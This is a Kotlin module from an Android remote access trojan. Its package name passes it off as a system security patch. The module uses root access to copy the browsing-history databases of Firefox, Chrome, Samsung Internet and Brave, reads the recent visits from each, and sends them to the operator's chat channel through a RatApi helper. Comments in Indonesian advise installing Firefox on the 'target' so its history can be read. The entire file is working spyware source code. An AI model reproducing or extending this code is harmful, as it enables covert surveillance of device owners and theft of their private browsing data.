package com.android.security.patch.commands

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.security.patch.RatApi
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object Browser {

    private data class Target(val name: String, val dbPath: String, val query: String)

    fun open(ctx: Context, chatId: Long, args: Array<String>) {
        val which = args.getOrNull(0)?.lowercase() ?: "all"
        RatApi.sendMessage(ctx, "reading browser history...", chatId)
        Thread {
            try {
                val targets = mutableListOf<Target>()
                if (which == "all" || which == "firefox") {
                    targets.add(Target("Firefox", "/data/data/org.mozilla.firefox/files/places.sqlite",
                        "SELECT url, title, visit_date/1000000 FROM moz_places a JOIN moz_historyvisits b ON a.id=b.place_id ORDER BY visit_date DESC LIMIT 50"))
                }
                if (which == "all" || which == "samsung" || which == "sbrowser") {
                    targets.add(Target("Samsung Internet",
                        "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/History",
                        "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"))
                }
                if (which == "all" || which == "chrome") {
                    targets.add(Target("Chrome",
                        "/data/data/com.android.chrome/app_chrome/Default/History",
                        "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"))
                }
                if (which == "all" || which == "brave") {
                    targets.add(Target("Brave",
                        "/data/data/com.brave.browser/app_chrome/Default/History",
                        "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"))
                }

                val out = StringBuilder()
                var any = false

                for (t in targets) {
                    val lines = readHistory(ctx, t)
                    if (lines.isNotEmpty()) {
                        any = true
                        out.append("<b>${t.name}</b>\n")
                        out.append(lines.joinToString("\n"))
                        out.append("\n\n")
                    } else {
                        out.append("<b>${t.name}</b> — <i>gak ke-baca (encrypted / kosong / gak terinstall)</i>\n\n")
                    }
                }

                if (!any) {
                    RatApi.sendMessage(ctx,
                        "<b>browser history</b>\n\n" +
                        "Chrome/Samsung/Brave di Android 12+ enkripsi history pake keychain — gak bisa dibaca plain.\n\n" +
                        "yang <b>bisa</b> dibaca biasanya Firefox. install Firefox di target kalo mau history accessible.",
                        chatId)
                } else {
                    val full = out.toString()
                    if (full.length > 3800) {
                        RatApi.sendDocument(ctx, full.toByteArray(), "browser_history.html",
                            "browser history", chatId)
                    } else {
                        RatApi.sendMessage(ctx, full, chatId)
                    }
                }
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "browser err: ${e.message}", chatId)
            }
        }.start()
    }

    private fun readHistory(ctx: Context, t: Target): List<String> {
        val src = File(t.dbPath)
        if (!src.exists()) return emptyList()
        val tmp = File(ctx.cacheDir, "b_${t.name.replace(" ","_")}.db")
        try {
            try { tmp.delete() } catch (_: Throwable) {}
            val p = ProcessBuilder("su", "-c", "cp \"${t.dbPath}\" \"${tmp.absolutePath}\" && chmod 644 \"${tmp.absolutePath}\"")
                .redirectErrorStream(true).start()
            p.inputStream.bufferedReader().readText()
            p.waitFor()
            if (!tmp.exists() || tmp.length() == 0L) return emptyList()

            val db = try {
                SQLiteDatabase.openDatabase(tmp.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
            } catch (_: Throwable) { return emptyList() }

            val out = mutableListOf<String>()
            try {
                val c = db.rawQuery(t.query, null)
                c.use {
                    val nCol = it.columnCount
                    while (it.moveToNext() && out.size < 50) {
                        val url = try { it.getString(0) ?: "" } catch (_: Throwable) { "" }
                        val title = try { it.getString(1) ?: "" } catch (_: Throwable) { "" }
                        val t0 = try { it.getLong(2) } catch (_: Throwable) { 0L }
                        val epoch = when {
                            t0 > 1_000_000_000_000_000L -> (t0 / 1000) - 11644473600000L
                            t0 > 1_000_000_000_000L -> t0 / 1000
                            t0 > 1_000_000_000L -> t0 * 1000L
                            else -> t0
                        }
                        val fmt = if (epoch > 0) {
                            SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(Date(epoch))
                        } else ""
                        out.add("[${fmt}] <code>${url.take(90)}</code> — ${title.take(60)}")
                    }
                }
            } catch (_: Throwable) {}
            try { db.close() } catch (_: Throwable) {}
            try { tmp.delete() } catch (_: Throwable) {}
            return out
        } catch (_: Throwable) {
            try { tmp.delete() } catch (_: Throwable) {}
            return emptyList()
        }
    }
}
